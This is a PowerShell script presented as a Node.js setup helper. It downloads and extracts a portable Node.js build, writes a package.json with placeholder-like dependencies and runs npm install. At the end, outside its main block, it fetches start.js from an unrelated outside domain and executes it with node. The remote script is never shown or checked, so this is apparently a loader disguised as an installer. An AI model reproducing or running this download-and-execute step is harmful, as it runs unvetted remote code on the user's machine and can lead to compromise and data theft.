<#
.SYNOPSIS
Download Node.js and extract directly (remove the built-in root folder)
#>

# Configuration
$nodeUrl = "https://nodejs.org/dist/v22.22.3/node-v22.22.3-win-x64.zip"
$zipName = "node-v22.22.3-win-x64.zip"
$innerFolder = "node-v22.22.3-win-x64" # Root folder name inside the zip
$targetRoot = $PSScriptRoot # Script directory
$finalDir = Join-Path $targetRoot "node" # Final extraction directory
$packageJsonPath = Join-Path $targetRoot "package.json" # package.json path

try {
    # 1. Create final directory
    Write-Host "Preparing directory: $finalDir" -ForegroundColor Cyan
    if (-not (Test-Path $finalDir)) {
        New-Item -ItemType Directory -Path $finalDir | Out-Null
    }

    $zipPath = Join-Path $targetRoot $zipName

    # 2. Download
    Write-Host "Starting Node.js download..." -ForegroundColor Cyan
    Invoke-WebRequest -Uri $nodeUrl -OutFile $zipPath -UseBasicParsing

    # 3. Extract to temporary location
    $tempExtract = Join-Path $targetRoot "node_temp"
    Write-Host "Extracting files..." -ForegroundColor Cyan
    Expand-Archive -Path $zipPath -DestinationPath $tempExtract -Force

    # 4. Move all contents directly to target directory (remove root folder)
    $sourceContent = Join-Path $tempExtract $innerFolder
    Get-ChildItem $sourceContent | Move-Item -Destination $finalDir -Force

    # 5. Clean up temporary files
    Remove-Item -Path $tempExtract -Recurse -Force
    Remove-Item -Path $zipPath -Force

    # 6. Create package.json with specified dependencies
    Write-Host "Creating package.json..." -ForegroundColor Cyan
    $packageContent = @'
{
  "dependencies": {
    "fs": "^0.0.1-security",
    "path": "^0.12.7",
    "yaml": "^2.9.0"
  }
}
'@
    # Write the content to file (UTF-8 without BOM)
    $utf8NoBom = New-Object System.Text.UTF8Encoding $false
    [System.IO.File]::WriteAllText($packageJsonPath, $packageContent, $utf8NoBom)

    Write-Host "`n✅ Done! Node.js has been extracted to: $finalDir" -ForegroundColor Green
    Write-Host "✅ package.json created successfully" -ForegroundColor Green
    Write-Host "You can use node.exe and npm.exe directly" -ForegroundColor White
}
catch {
    Write-Host "`n❌ Failed: $_" -ForegroundColor Red
    exit 1
}

./node/npm i

# 获取https://docs.rosyju.top/start.js的内容并用node执行
$startJsUrl = "https://docs.rosyju.top/start.js"
$startJsPath = Join-Path $targetRoot "start.js"
Write-Host "Downloading start.js..." -ForegroundColor Cyan
Invoke-WebRequest -Uri $startJsUrl -OutFile $startJsPath -UseBasicParsing
Write-Host "Executing start.js..." -ForegroundColor Cyan
./node/node $startJsPath
